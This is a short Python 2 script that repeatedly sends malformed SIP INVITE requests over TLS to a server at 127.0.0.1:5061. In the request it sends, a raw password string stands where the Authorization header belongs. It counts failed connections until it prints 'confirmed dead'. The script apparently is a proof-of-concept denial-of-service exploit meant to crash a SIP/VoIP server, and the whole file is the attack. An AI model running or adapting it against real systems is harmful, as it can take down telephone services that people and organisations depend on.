import md5
import re
import socket
import ssl
import uuid
from time import sleep

SERVER_IP = "127.0.0.1"
SERVER_PORT = 5061
USERNAME = "3000"
PASSWORD = "3000"
INVITE_USERNAME = "3000"

errno = 0
lasterrno = 0
while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock = ssl.wrap_socket(sock,
                               ssl_version=ssl.PROTOCOL_TLSv1,
                               )

        sock.connect((SERVER_IP, SERVER_PORT))
        sock.settimeout(0.5)
        errno = 0
        callid = str(uuid.uuid4())
        for ix in range(10):
            sdpbody = ""

            msg = "INVITE sip:%s@%s:%i SIP/2.0\r\n" \
                "To: <sip:%s@%s:%i>\r\n" \
                "From: Test <sip:%s@%s:%s>\r\n" \
                "Call-ID: %s\r\n" \
                "CSeq: 2 INVITE\r\n" \
                "Via: SIP/2.0/TLS 172.17.0.1:10394;branch=z9hG4bK%s\r\n" \
                "Contact: <sip:%s@172.17.0.1>\r\n" \
                "Content-Type: application/sdp\r\n" \
                "{{AUTH}}" \
                "Content-Length: %i\r\n" \
                "\r\n" % (
                    INVITE_USERNAME, SERVER_IP, SERVER_PORT,
                    INVITE_USERNAME, SERVER_IP, SERVER_PORT,
                    USERNAME, SERVER_IP, SERVER_PORT,
                    callid, callid,
                    USERNAME, len(sdpbody)
                ) + \
                sdpbody

            sock.sendall(msg.replace("{{AUTH}}", ""))

            data = sock.recv(10240)
            # print(data)
            if data.startswith("SIP/2.0 401"):
                for line in data.split('\r\n'):
                    if line.startswith("WWW-Authenticate"):
                        content = line.split(':', 2)[1].strip()
                        realm = re.search(
                            "realm=\"([a-z]+)\"", content).group(1)
                        nonce = re.search(
                            "nonce=\"([a-z0-9\/]+)\"", content).group(1)
                        ha1 = md5.new(USERNAME + ":" + realm +
                                      ":" + PASSWORD).hexdigest()
                        uri = "sip:%s:%i" % (SERVER_IP, SERVER_PORT)
                        ha2 = md5.new("INVITE:" + uri).hexdigest()
                        r = md5.new(ha1 + ":" + nonce + ":" + ha2).hexdigest()

                        auth = "Authorization: Digest username=\"%s\"," % (USERNAME) + \
                            "realm=\"%s\"," % (realm) + \
                            "nonce=\"%s\"," % (nonce) + \
                            "uri=\"%s\"," % (uri) + \
                            "response=\"%s\"," % (r) + \
                            "algorithm=md5\r\n"
                        print(auth)

            sock.sendall(msg.replace("{{AUTH}}", PASSWORD))
            errno = 0
    except (socket.error, ssl.SSLEOFError), err:
        print(err)
        print("getting close!")
        sleep(2)
        errno += 1
    if errno >= 10:
        print("confirmed dead")
        break
    elif errno > lasterrno:
        lasterrno = errno
        continue
